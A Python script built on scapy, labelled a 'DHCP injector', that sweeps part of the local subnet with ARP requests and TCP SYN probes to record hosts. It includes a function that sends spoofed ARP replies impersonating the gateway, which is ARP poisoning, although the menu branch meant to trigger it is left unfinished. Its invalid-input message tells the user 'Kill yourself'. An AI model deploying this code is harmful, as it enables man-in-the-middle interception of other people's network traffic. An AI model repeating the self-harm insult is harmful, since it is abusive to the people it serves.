from scapy.all import *
from datetime import datetime
import sys
import socket

# Dictionary to store DHCP bindings
dhcp_bindings = {}
MY_MAC = "DC:97:BA:17:82:BA"

gateway_ip = "192.168.1.1"
dns_server_ip = "192.168.1.1"
Intface = "eth0"

leases = {}
    
def get_local_ip():
    try:
        # Connect to an external IP (Google DNS) without sending data
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        return f"Error: {e}"

def GetDHCPMac():
    first_key = next(iter(dhcp_bindings))
    return first_key

def get_mac_from_ip(ip, bindings):
    for mac, bound_ip in bindings.items():
        if bound_ip == ip:
            return mac
    return None  # not found

def print_help():   
    print("DHCP injector:")
    print("S - Map TCP connections of other devices")
    print("A - send ARP poisoning attack to all addresses in table")
    print("Q - Quit the program")

def print_bindings():
    """
    Print the current DHCP bindings in a neat table.
    """
    if not dhcp_bindings:
        print("No DHCP bindings found.\n")
        return

    print("\n{:<4} {:<20} {:<15}".format("No.", "MAC Address", "IP Address"))
    print("-" * 43)
    for idx, (mac, ip) in enumerate(dhcp_bindings.items(), 1):
        print("{:<4} {:<20} {:<15}".format(idx, mac, ip))
    print("-" * 43 + "\n")

def tcp_arp_scan_dynamic():
    """
    Perform a TCP ARP scan on the /24 subnet of the current local IP.
    """
    local_ip = get_local_ip()
    print(f"Scanning for devices on local network: {local_ip} with subnet /24")
    base_ip_parts = local_ip.split(".")[:3]  # e.g., ['192', '168', '0']

    for i in range(1, 10):
        #Step 1: ARP to get MAC address
        target_ip = f"{base_ip_parts[0]}.{base_ip_parts[1]}.{base_ip_parts[2]}.{i}"
        interface = Intface

        arp_request = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_request

        ans, _ = srp(packet, timeout=2, iface=interface, verbose=False)

        if ans:
            target_mac = ans[0][1].hwsrc
            print(f"[+] MAC Address of {target_ip} is {target_mac}")
            dhcp_bindings[target_mac] = target_ip  # Store IP and MAC
        else:
            print(f"[-] No ARP reply received. Host may be offline.")
            continue

        # Step 2: TCP SYN to check for online presence
        ip = IP(dst=target_ip)
        tcp = TCP(dport=80, flags="S")  # SYN to port 80

        response = sr1(ip/tcp, timeout=.5, iface=interface, verbose=False)

        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            print(f"[+] Host {target_ip} is online. Received SYN-ACK.")
            # Send RST to close the half-open connection
            rst = TCP(dport=80, sport=response.sport, flags="R", seq=response.ack, ack=response.seq + 1)
            send_rst = ip / rst
            sr1(send_rst, timeout=1, verbose=False)
        else:
            print(f"[-] No SYN-ACK. Host may be down or port is closed.")

def attack_all_addresses(): 
    """
    Send ARP poisoning attack to all addresses in the DHCP bindings.
    """
    for mac, ip in dhcp_bindings.items():
        print(f"Sending ARP poison to {ip} ({mac})")
        arp_response = ARP(op=2, pdst=ip, hwdst=mac, psrc=gateway_ip, hwsrc=MY_MAC)
        send(arp_response, verbose=False)
        print(f"ARP poison sent to {ip} ({mac})")

def main():
    print("Press H for help or Q to quit.\n")
    while True:
        choice = input(">> ").strip().upper()
        if choice == "S":
            print("Mapping TCP connections of other devices...")
            tcp_arp_scan_dynamic()  
            print("ARP scan completed. Current DHCP bindings:")
            print_bindings()
           
            
        elif choice == "H":
            print_help()
        elif choice == "Q":
            print("Exiting DHCP Monitor. Goodbye!")
            sys.exit(0)
        elif choice == "P":
            print_bindings()
        elif choice.startswith("A "):
            parts = choice.split()
            if len(parts) >= 2:
                ip = parts[1][:]  # Remove the dash
                
        else:
            print("Invalid choice. Kill yourself \n")

if __name__ == "__main__":
    main()